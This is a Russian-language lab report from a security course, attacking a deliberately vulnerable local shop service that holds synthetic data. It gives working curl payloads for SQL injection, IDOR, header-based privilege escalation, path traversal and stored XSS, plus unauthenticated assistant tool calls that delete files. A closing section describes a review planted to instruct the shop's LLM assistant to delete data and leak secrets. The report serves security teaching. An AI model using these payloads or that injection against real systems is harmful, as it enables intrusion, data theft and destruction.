# REPORT_01 — Отчёт об атаках на Mini Shop (до исправлений)

**Практика 6. Моделирование угроз и атаки с помощью LLM**

Стенд: `practices/practice_06/lab/service.py`, запущен командой
`python3 service.py --port 8066` (порт 8066 был свободен), слушает только
`127.0.0.1`. Все данные синтетические (`TEST_*`, `example.invalid`). Код сервиса
не менялся — выполнялись только атаки и фиксация результата. Запросы делались
`curl` из отдельного процесса; вход и фактический ответ сохранены в
`practices/practice_06/evidence/before/`.

Учебные пользователи: `alice`/`learn-alice` (id 1), `bob`/`learn-bob` (id 2),
`staff`/`learn-staff` (id 0). Токен из `POST /login` передаётся в `X-Token`.
Одноразовый каталог стенда в сессии:
`/private/var/folders/.../itmo-practice-06-4u_4sk72`.

## Сводка находок

| № | Уязвимость | Эндпоинт | Класс (OWASP/CWE) | Затронутый актив | Доказательство |
|---|---|---|---|---|---|
| 1 | SQL-инъекция (чтение всех профилей, UNION к схеме) | `GET /profile?id=` | A03 Injection / CWE-89 | ПДн всех клиентов, схема БД | `01_sqli_profile.txt`, `01b_sqli_profile_union.txt` |
| 2 | SQL-инъекция в поиске | `GET /search?q=` | A03 Injection / CWE-89 | ПДн всех клиентов | `02_sqli_search.txt` |
| 3 | Нет аутентификации + IDOR | `GET /profile?id=2`, `GET /orders` | A01 Broken Access Control / CWE-306, CWE-639 | Чужие профили и заказы | `03_idor_nosession.txt` |
| 4 | Повышение привилегий через заголовок | `GET /admin/export` + `X-Role: staff` | A01 / CWE-290 | Экспорт всех профилей | `04_priv_header.txt` |
| 5 | Подмена цены клиентом | `POST /orders` (`price`) | A04 Insecure Design / CWE-472 | Целостность цены/выручка | `05_price_tamper.txt` |
| 6 | Обход владельца и path traversal | `GET /files?user=&path=` | A01 / CWE-22, CWE-639 | Чужой чек, служебная заметка | `06_files_traversal.txt` |
| 7 | Stored XSS | `POST /reviews` → `GET /reviews/view` | A03 / CWE-79 | Сессии/браузеры посетителей | `07_stored_xss.txt` |
| 8 | Утечка журнала (пароли, токены, тела) | `GET /debug/logs` | A09/A01 / CWE-532, CWE-200 | Все пароли и токены сессий | `08_debug_logs.txt` |
| 9 | Утечка текста ошибки (детали SQL) | `GET /profile?id=abc` → 500 | A05 Misconfiguration / CWE-209 | Внутренности БД/стек | `09_error_leak.txt` |
| 10 | Нет контроля доступа к инструментам помощника | `POST /assistant/execute` | A01 / CWE-862 | ПДн, файлы, удаление данных | `10a/10b/10c_execute_*.txt`, `pi_manual_execute.txt` |

Дополнительно задокументирована проверка prompt injection на реальной модели
(раздел «Prompt injection»).

---

## 1. SQL-инъекция в `GET /profile?id=`

**Что:** параметр `id` подставляется в SQL без параметризации
(`service.py:57`: `f"SELECT * FROM profiles WHERE id = {query.get('id', '1')}"`).

**Запрос:**
```
curl -s -G 'http://127.0.0.1:8066/profile' --data-urlencode 'id=0 OR 1=1'
```
**Ответ:**
```json
[{"id": 1, "name": "TEST_ALICE", "email": "alice@example.invalid", "address": "TEST_ADDRESS_A"},
 {"id": 2, "name": "TEST_BOB", "email": "bob@example.invalid", "address": "TEST_ADDRESS_B"}]
```
UNION к служебным таблицам (чтение схемы и версии СУБД):
```
curl -s -G 'http://127.0.0.1:8066/profile' \
  --data-urlencode 'id=-1 UNION SELECT 99,sqlite_version(),name,sql FROM sqlite_master'
```
```json
[{"id": 99, "name": "3.53.4", "email": "orders", "address": "CREATE TABLE orders(...)"},
 {"id": 99, "name": "3.53.4", "email": "profiles", "address": "CREATE TABLE profiles(...)"}]
```
**Почему дыра:** произвольная модификация запроса позволяет выгрузить все записи
и разведать схему БД. **Актив:** персональные данные всех клиентов, структура БД.
**Строка:** `service.py:57`.

---

## 2. SQL-инъекция в `GET /search?q=`

**Что:** `q` вставляется в `LIKE '%...%'` без экранирования (`service.py:59`).

**Запрос:**
```
curl -s -G 'http://127.0.0.1:8066/search' \
  --data-urlencode "q=' UNION SELECT id,email,address,name FROM profiles-- "
```
**Ответ:**
```json
[{"id": 1, "name": "TEST_ALICE", "email": "alice@example.invalid", "address": "TEST_ADDRESS_A"},
 {"id": 1, "name": "alice@example.invalid", "email": "TEST_ADDRESS_A", "address": "TEST_ALICE"},
 {"id": 2, "name": "TEST_BOB", "email": "bob@example.invalid", "address": "TEST_ADDRESS_B"},
 {"id": 2, "name": "bob@example.invalid", "email": "TEST_ADDRESS_B", "address": "TEST_BOB"}]
```
Даже без инъекции пустой `q=` даёт `LIKE '%%'` и выгружает всех. **Почему дыра:**
полный контроль над выборкой, обход любой фильтрации. **Актив:** ПДн всех клиентов.
**Строка:** `service.py:59`.

---

## 3. Доступ без сессии и IDOR в `GET /profile` и `GET /orders`

**Что:** оба эндпоинта не требуют `X-Token` и не фильтруют по владельцу
(`service.py:56-57`, `60-61`).

**Запросы и ответы (без токена):**
```
curl -s -G 'http://127.0.0.1:8066/profile' --data-urlencode 'id=2'
=> [{"id": 2, "name": "TEST_BOB", "email": "bob@example.invalid", "address": "TEST_ADDRESS_B"}]

curl -s 'http://127.0.0.1:8066/orders'
=> [{"id": 1, "owner": 1, "product": "chair", "price": 5000.0},
    {"id": 2, "owner": 2, "product": "lamp", "price": 1500.0}]
```
**Почему дыра:** любой неаутентифицированный пользователь читает профиль и все
заказы чужих клиентов (`GET /orders` отдаёт всю таблицу без фильтра по `owner`).
**Актив:** чужие ПДн и заказы. **Строки:** `service.py:56-57`, `60-61`.

---

## 4. Повышение привилегий через заголовок `X-Role`

**Что:** доступ к экспорту определяется присланным заголовком `X-Role`, а не
серверной сессией (`service.py:74-77`).

**Запрос (без логина staff):**
```
curl -s 'http://127.0.0.1:8066/admin/export' -H 'X-Role: staff'
=> [{"id": 1, "name": "TEST_ALICE", ...}, {"id": 2, "name": "TEST_BOB", ...}]

# контроль — без заголовка:
curl -s 'http://127.0.0.1:8066/admin/export'  => {"error": "staff only"}
```
**Почему дыра:** клиент сам объявляет свою роль; любой может выгрузить всех
клиентов, добавив один заголовок. **Актив:** экспорт всех профилей (ПДн).
**Строка:** `service.py:75`.

---

## 5. Подмена цены в `POST /orders`

**Что:** цена берётся из тела запроса, если прислана (`service.py:69`:
`price = body.get("price", self.products[product])`), каталог не авторитетен.

**Запрос (токен alice):**
```
curl -s -X POST 'http://127.0.0.1:8066/orders' -H 'Content-Type: application/json' \
  -H 'X-Token: <alice>' -d '{"product":"chair","price":1}'
=> {"id": 3, "owner": 1, "product": "chair", "price": 1}
```
**Почему дыра:** клиент покупает стул (каталог 5000) за 1 — нарушение целостности
бизнес-логики/выручки. **Актив:** целостность цены, финансы. **Строки:** `service.py:69-73`.

---

## 6. Обход владельца и path traversal в `GET /files`

**Что:** путь собирается конкатенацией `files/{user}/{path}` без проверки
владельца и без ограничения на `..` на уровне сервиса (`service.py:78-80`).
Физическую границу держит `sandbox.py`, но внутри неё доступ не разграничен.

**Запросы и ответы (без токена):**
```
curl -s -G 'http://127.0.0.1:8066/files' --data-urlencode 'user=bob' --data-urlencode 'path=receipt.txt'
=> {"content": "TEST_BOB receipt: lamp, 1500 RUB"}

curl -s -G 'http://127.0.0.1:8066/files' --data-urlencode 'user=../private' --data-urlencode 'path=operator-note.txt'
=> {"content": "TEST_ONLY_OPERATOR_SECRET"}
```
**Почему дыра:** чтение чужого чека и закрытой служебной заметки обходом каталога
(`../private`). **Актив:** чужие чеки, служебный секрет. **Строки:** `service.py:78-80`.

---

## 7. Stored XSS в `POST /reviews` → `GET /reviews/view`

**Что:** текст отзыва сохраняется как есть и вставляется в HTML без экранирования
(`service.py:84`, `87`: `f"<p>{r['text']}</p>"`).

**Запросы и ответ:**
```
curl -s -X POST 'http://127.0.0.1:8066/reviews' -H 'Content-Type: application/json' \
  -d '{"product":"chair","text":"<script>alert(document.cookie)</script><img src=x onerror=alert(1)>"}'
=> {"saved": true}

curl -s 'http://127.0.0.1:8066/reviews/view'
=> <html><body><p><script>alert(document.cookie)</script><img src=x onerror=alert(1)></p></body></html>
```
**Почему дыра:** внедрённый `<script>`/`<img onerror>` возвращается без экранирования
и исполнится в браузере посетителя (кража cookie/сессии). **Актив:** сессии и
браузеры всех посетителей страницы отзывов. **Строки:** `service.py:84, 87`.

---

## 8. Утечка журнала в `GET /debug/logs`

**Что:** в лог пишется каждый запрос целиком — метод, путь, **тело и заголовки**
(`service.py:44`), и отдаётся без аутентификации (`service.py:81-82`).

**Запрос:** `curl -s 'http://127.0.0.1:8066/debug/logs'`
**Ответ (фрагменты):**
```json
{"method":"POST","target":"/login","body":{"username":"alice","password":"learn-alice"},...}
{"method":"POST","target":"/login","body":{"username":"bob","password":"learn-bob"},...}
{"method":"POST","target":"/orders",...,"headers":{...,"X-Token":"d34ce84bd2dd4d47995f539f74f49c8f",...}}
```
**Почему дыра:** журнал раскрывает пароли в открытом виде и действующие токены
сессий — полный захват учётных записей. **Актив:** все пароли и токены сессий.
**Строки:** `service.py:44`, `81-82`.

---

## 9. Утечка текста ошибки (детали SQL)

**Что:** необработанное исключение возвращается клиенту как
`{"error": str(exc), "type": ...}` (`service.py:128-129`).

**Запрос:** `curl -s -G 'http://127.0.0.1:8066/profile' --data-urlencode 'id=abc'` → HTTP 500
**Ответ:**
```json
{"error": "no such column: abc", "type": "OperationalError"}
```
**Почему дыра:** сообщения СУБД/типы исключений раскрывают внутренности и упрощают
эксплуатацию SQLi (blind → error-based). **Актив:** внутренняя информация о БД/коде.
**Строки:** `service.py:128-129`.

---

## 10. Нет контроля доступа к инструментам помощника `POST /assistant/execute`

**Что:** эндпоинт исполняет любой присланный `decision.tool` без токена, сессии и
проверки владельца (`service.py:99-109`).

**export_profiles (без токена):**
```
curl -s -X POST '.../assistant/execute' -d '{"decision":{"tool":"export_profiles","arguments":{}}}'
=> [{"id":1,"name":"TEST_ALICE",...},{"id":2,"name":"TEST_BOB",...}]
```
**read_file (служебная заметка и чужой чек):**
```
... -d '{"decision":{"tool":"read_file","arguments":{"path":"private/operator-note.txt"}}}'
=> {"content": "TEST_ONLY_OPERATOR_SECRET"}
... -d '{"decision":{"tool":"read_file","arguments":{"path":"files/bob/receipt.txt"}}}'
=> {"content": "TEST_BOB receipt: lamp, 1500 RUB"}
```
**delete_tree (удаление `files/bob`, чек исчезает):**
```
... -d '{"decision":{"tool":"delete_tree","arguments":{"path":"files/bob"}}}'
=> {"deleted": "files/bob"}
# повторное чтение:
=> {"error": "[Errno 2] No such file or directory: '.../files/bob/receipt.txt'", "type": "FileNotFoundError"}
```
Файлы восстанавливаются перезапуском сервиса (одноразовый каталог стенда).
**Почему дыра:** деструктивные и конфиденциальные инструменты доступны любому
анонимному вызову — экспорт ПДн, чтение закрытых файлов, уничтожение данных.
**Актив:** ПДн, файлы стенда, целостность/доступность данных. **Строки:** `service.py:99-109`.

---

## Prompt injection на реальной модели

### а) Чистый контекст
`GET /assistant/context?order_id=1` (токен alice) — вход сохранён в
`pi_context_clean.txt`. Промпт содержит инструкцию помощнику, данные заказа и
массив отзывов.

### б) Запуск модели shop-planner
```
env PWD=/Users/lewolkogonov/ITMOv2 opencode run --dir practices/practice_06 \
  --agent shop-planner --model opencode/big-pickle --format json \
  --file /tmp/ctx_clean.txt -- "Помоги получить мой чек по заказу"
```
**Результат: модель НЕДОСТУПНА.** `opencode auth list` → «0 credentials»; модель
`opencode/big-pickle` присутствует в `opencode models`, но запуск зависает
бесконечно без вывода (stdout/stderr пусты), процесс завершается только
принудительно (фоновый прогон убит с кодом 143; под python `timeout=90s` —
`TIMEOUT`, `partial stdout=None`, `partial stderr=None`). См. `pi_answer_clean.txt`.

### в) Вредоносный отзыв (инъекция в данных)
Через `POST /reviews` добавлен отзыв с инструкцией помощнику выполнить
`delete_tree`/`export_profiles`/прочитать `private/operator-note.txt`
(`pi_review_injected.txt`). Контекст с инъекцией сохранён в
`pi_context_injected.txt`; повторный запуск модели дал тот же результат —
модель недоступна (`pi_answer_injected.txt`).

### г) Обязательный тест контроля доступа (ручной JSON)
Поскольку оценивается серверная проверка доступа, независимо от послушания LLM,
изготовленный вручную JSON отправлен напрямую в `/assistant/execute` **без токена
и сессии** (`pi_manual_execute.txt`):
```
BEFORE: read files/alice/receipt.txt => {"content":"TEST_ALICE receipt: chair, 5000 RUB"}
DELETE: {"decision":{"tool":"delete_tree","arguments":{"path":"files/alice"}}} => {"deleted":"files/alice"}
AFTER:  read files/alice/receipt.txt => {"error":"[Errno 2] No such file or directory: ...","type":"FileNotFoundError"}
export_profiles => [все профили]
read_file private/operator-note.txt => {"content":"TEST_ONLY_OPERATOR_SECRET"}
```
**Вывод:** сервер исполняет опасные инструменты из присланного JSON без
аутентификации и авторизации (`service.py:99-109`). Это самостоятельный дефект
контроля доступа (CWE-862), не зависящий от того, подчинилась ли LLM инъекции.
Прямая отправка JSON **не** доказывает подчинение модели — модель в этой сессии
проверить не удалось (недоступна).

---

## Итог

Воспроизведено 10 классов уязвимостей. Общая первопричина — доверие к данным от
клиента (параметры, заголовки, тело, отзывы) и отсутствие серверной
аутентификации/авторизации и экранирования. Для раздела prompt injection реальная
модель (`opencode/big-pickle`) оказалась недоступна (нет учётных данных opencode),
но обязательный тест серверного контроля доступа к инструментам помощника выполнен
и показал исполнение опасного ручного JSON без проверок.
